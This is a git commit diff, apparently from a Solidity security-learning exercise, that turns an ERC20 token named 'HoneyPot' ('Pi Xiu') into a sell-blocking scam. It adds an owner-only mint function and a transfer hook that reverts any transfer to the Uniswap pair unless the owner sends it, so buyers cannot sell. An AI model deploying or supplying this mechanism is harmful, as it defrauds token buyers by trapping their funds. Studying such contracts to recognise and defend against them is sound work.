4a08e9b4fd0366f0b0c4e76ce570ffb986711f23
zhou <1036767219@qq.com>
2022-12-22 20:13:53 +0800

    update HoneyPot合约

--- zhou/S10_Honeypot.sol
+++ zhou/S10_Honeypot.sol
@@ -10,6 +10,7 @@ contract HoneyPot is ERC20 , Ownable {
     constructor() ERC20("HoneyPot" , "Pi Xiu") {
         address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
         address tokenA = address(this);
+        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6;
         (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); 
         bytes32 salt = keccak256(abi.encodePacked(token0, token1));
         pair = address(uint160(uint(keccak256(abi.encodePacked(
@@ -20,5 +21,19 @@ contract HoneyPot is ERC20 , Ownable {
         )))));
     }
 
-    
+    function mint(address to, uint amount) public onlyOwner {
+        _mint(to, amount);
+    }
+
+    function _beforeTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual override {
+        super._beforeTokenTransfer(from, to, amount);
+        // 当转账的目标地址为 LP 合约时，会revert
+        if(to == pair){
+            require(from == owner(), "Can not Transfer");
+        }
+    }
 }
